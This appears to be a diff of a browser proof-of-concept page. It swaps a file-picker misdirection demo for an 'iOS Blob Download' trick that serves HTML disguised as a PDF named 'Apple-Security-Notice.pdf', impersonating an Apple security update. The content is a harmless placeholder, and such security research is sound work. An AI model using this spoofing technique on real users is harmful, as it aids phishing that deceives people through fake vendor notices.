@@ -1,65 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>File Upload Misdirection PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      text-align: center;
-    }
-
-    button {
-      background-color: #007aff;
-      border: none;
-      color: white;
-      padding: 15px;
-      font-size: 16px;
-      cursor: pointer;
-      border-radius: 10px;
-      margin-top: 20px;
-    }
-
-    img {
-      max-width: 100%;
-      margin-top: 20px;
-    }
-  </style>
-</head>
+<html>
 <body>
-
-<h1>Tap to Upload Image</h1>
-
-<!-- Simulated trusted site UI -->
-<button id="triggerButton">Upload Image</button>
-
-<img id="preview" style="max-width: 100%; margin-top: 20px;" />
+<h3>iOS Blob Download POC</h3>
+<button onclick="go()">Open</button>
 
 <script>
-  const triggerButton = document.getElementById('triggerButton');
+function go() {
+  const data = `
+    <html>
+      <body>
+        <h1>Apple Security Update</h1>
+        <p>Please review the attached document.</p>
+      </body>
+    </html>
+  `;
 
-  // Trigger file picker and navigation
-  triggerButton.addEventListener('click', () => {
-    // Open file picker (showOpenFilePicker in compatible browsers)
-    showOpenFilePicker().then(([fileHandle]) => {
-      fileHandle.getFile().then(file => {
-        // Read the file (simulating image preview)
-        const reader = new FileReader();
-        reader.onload = function(e) {
-          document.getElementById('preview').src = e.target.result;
-        };
-        reader.readAsDataURL(file);
-      });
-    });
+  const blob = new Blob([data], { type: "application/pdf" });
+  const url = URL.createObjectURL(blob);
 
-    // Redirect to a trusted site (simulating trusted destination)
-    setTimeout(() => {
-      window.location.href = 'https://www.google.com';
-    }, 1000);  // Delay to show the file picker first
-  });
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "Apple-Security-Notice.pdf";
+  a.click();
+}
 </script>
-
 </body>
 </html>
